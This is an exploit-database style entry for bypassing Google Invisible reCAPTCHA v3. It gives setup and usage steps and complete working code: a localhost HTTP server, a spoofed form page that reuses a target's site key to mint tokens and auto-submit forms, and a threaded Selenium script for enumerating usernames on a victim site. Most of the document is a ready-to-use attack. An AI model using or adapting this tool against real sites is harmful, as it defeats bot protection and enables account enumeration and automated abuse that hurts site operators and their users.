@@ -1,0 +1,182 @@
+# Exploit Title: Google Invisible RECAPTCHA 3 - Spoof Bypass
+# Date: 2020-02-07
+# Vendor Homepage: https://developers.google.com/recaptcha/docs/invisible
+# Exploit Git Repo: https://github.com/matamorphosis/Browser-Exploits/tree/master/RECAPTCHA_Bypass
+# Exploit Author: Matamorphosis
+# Tested on: Windows and Ubuntu 19.10
+# Category: Web Apps
+
+--------------------------------------------------------------------------------------------
+RECAPTCHA Bypass:
+--------------------------------------------------------------------------------------------
+This tool allows a user to bypass Version 3 of Google's Invisible RECAPTCHA by creating a spoofed web app that leverages the same RECAPTCHA, by providing the victims site key.  
+
+What makes a site vulnerable?
+1. They are using Version 3 of Google's Invisible RECAPTCHA
+2. They allow the site key to be used on "localhost". However, while currently untested you could try adding the DNS name of the target you are attacking and try resolving it to 127.0.0.1 in your hosts file.
+  
+NOTE: Exploit users need to have a functional understanding of both Python and JavaScript to make the necessary changes to run this exploit.
+
+--------------------------------------------------------------------------------------------
+PREREQUISITES:
+--------------------------------------------------------------------------------------------
+The instructions supplied are written for Debian-based Linux distributions. However, this can be setup on any OS with relative ease.
+1. Download and install Firefox located at https://www.mozilla.org/en-US/firefox/new/
+2. Download Gecko Driver located at https://github.com/mozilla/geckodriver/releases and ensure the binary is in your path. For *nux just copy the file to /usr/bin
+```
+user@linux:~$ sudo cp geckodriver /usr/bin/geckodriver
+```
+3. To use this exploit, you need to install python3, pip3 and install the additional requirements that are in the requirements.txt file.
+```
+user@linux:~$ sudo apt install python3 python3-pip -y
+```
+4. Now install the prerequisistes
+```
+user@linux:~$ pip3 install -r requirements.txt
+```
+
+--------------------------------------------------------------------------------------------
+USAGE:
+--------------------------------------------------------------------------------------------
+1. Obtain the site key from the target web application. There should be JavaScript that looks like the following - use the inspect element function to view it, there are two locations you can grab the site key:
+```
+<script src="https://www.google.com/recaptcha/api.js?render=<SITE-KEY-HERE>"></script>
+<script>
+  grecaptcha.ready(function() {
+    grecaptcha.execute('<SITE-KEY-HERE>', {action:'validate_captcha'})
+          .then(function(token) {
+      // add token value to form
+      document.getElementById('g-recaptcha-response').value = token;
+    });
+  });
+</script>
+```
+2. Open the index.html file and paste the Site Key into the appropriate locations.
+3. This next part is where it gets a little tricky. You need to replicate the form you are attacking and change a few things. Firstly in the body of the index.html file. Ensure you are using the appropriate method "GET" or "POST" and you are submitting it to the correct destination.
+```
+<body>
+	<form id="form_id" method="<METHOD GOES HERE>" action="<VICTIM FORM SUBMISSION LINK>"
+		<input type="hidden" id="g-recaptcha-response" name="captcha">
+		<input id="accName" type="text" name="accountName" value="">
+		<input id="uName" type="text" name="username" value="">
+		<input type="submit" value="Submit">
+	</form>
+</body>
+```
+*For steps 4-6, example code has been provided already, but ensure it matches the site you are targetting. It may be easier to strip it out and follow 4-6 if you are having a difficult time getting it working.*  
+  
+4. Next you will need to add the following lines to the body of the JavaScript already inside of the <script> tags in the head of the html, after the last line.
+```
+var url_string = window.location.href;
+var url = new URL(url_string);
+```
+5. After this you need to add the following lines **for each** visible <input> tag in the form you are attacking. This code will automatically take what parameters are provided to the page and set the input elements accordingly.
+```
+var paramValue1 = url.searchParams.get("accountName");
+var account = document.getElementById("accName");
+account.value = paramValue1;
+```
+6. Lastly, add the following lines after you have added JavaScript for each of the <input> tags:
+```
+var frm = document.getElementById("form_id");
+frm.submit();
+```
+7. Now you need to edit the enumerate.py file to suit your needs. First ensure you change the function to suit the parameters required by your index.html file. In the below example I am trying to enumerate usernames, for an accountname that is the same everytime. Note: You must use "localhost" or a DNS name, using "127.0.0.1" or another IP address will probably not work.
+```
+accountName = 'testAccount'
+
+def attempt(user):
+    driver = webdriver.Firefox()
+    driver.get(f'http://localhost:8000?accountName={accountName}&username={user}')
+```
+8. Everytime the above function is called, a new Firefox window will be opened, and the link will be called. *If you wish to try and get this working in a headless mode and you succeed, kindly contribute your changes to this repository* This will allow for the JavaScript to be executed to get the needed CAPTCHA which will automatically be forwarded onto the destination. After this create a threaded for loop to suit your needs that iterates through a list, that calls the above function for each attempt:
+```
+for user in ['user1', 'user2', 'user3']:
+    thread = threading.Thread(target=attempt, args=(user,))
+    thread.start()
+```
+9. You are now ready to run the exploit, in one terminal session start the web server. This will run on localhost on TCP port 8000. You can change these settings by editing the http_serve.py file:
+```
+user@linux:~$ python3 http_serve.py
+```
+10. In another terminal session, run the enumerate.py script, and watch it run!
+```
+user@linux:~$ python3 enumerate.py
+```
+--------------------------------------------------------------------------------------------
+FILES:
+--------------------------------------------------------------------------------------------
+---- http_serve.py ----
+--------------------------------------------------------------------------------------------
+#!/usr/bin/python3
+import http.server
+import socketserver
+
+PORT = 8000
+
+Handler = http.server.SimpleHTTPRequestHandler
+
+httpd = socketserver.TCPServer(("localhost", PORT), Handler)
+
+print("serving at port", PORT)
+httpd.serve_forever()
+
+--------------------------------------------------------------------------------------------
+---- enumerate.py ----
+--------------------------------------------------------------------------------------------
+#!/usr/bin/python3
+from selenium import webdriver
+from selenium.common.exceptions import TimeoutException
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.common.by import By
+import threading
+
+accountName = 'foobar'
+
+def attempt(user):
+    driver = webdriver.Firefox()
+    driver.get(f'http://localhost:8000?accountName={accountName}&username={user}')
+
+for user in ['user1', 'user2', 'user3']:
+    thread = threading.Thread(target=attempt, args=(user,))
+    thread.start()
+
+--------------------------------------------------------------------------------------------
+---- index.html ----
+--------------------------------------------------------------------------------------------
+<!DOCTYPE html>
+	<head>
+		<script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/TYDIjJAqCk6g335bFk3AjlC3/recaptcha__en.js"></script>
+		<script src="https://www.google.com/recaptcha/api.js?render=<SITE_KEY_GOES_HERE>"></script>
+		<script>
+			grecaptcha.ready(function() {
+			// do request for recaptcha token
+			// response is promise with passed token
+				grecaptcha.execute('<SITE_KEY_GOES_HERE>', {action:'validate_captcha'})
+						  .then(function(token) {
+					// add token value to form
+					document.getElementById('g-recaptcha-response').value = token;
+					var url_string = window.location.href;
+					var url = new URL(url_string);
+					var paramValue1 = url.searchParams.get("accountName");
+					var account = document.getElementById("accName");
+					account.value = paramValue1;
+					var paramValue2 = url.searchParams.get("username");
+					var uname = document.getElementById("uName");
+					uname.value = paramValue2;
+					var frm = document.getElementById("form_id");
+					frm.submit();
+				});
+			});
+		</script>
+	</head>
+	<body>
+		<form id="form_id" method="<METHOD>" action="<VICTIM FORM SUBMISSION LINK>">
+			<input type="hidden" id="g-recaptcha-response" name="captcha">
+			<input id="accName" type="text" name="accountName" value="">
+			<input id="uName" type="text" name="username" value="">
+			<input type="submit" value="Submit">
+		</form>
+	</body>
+</html>
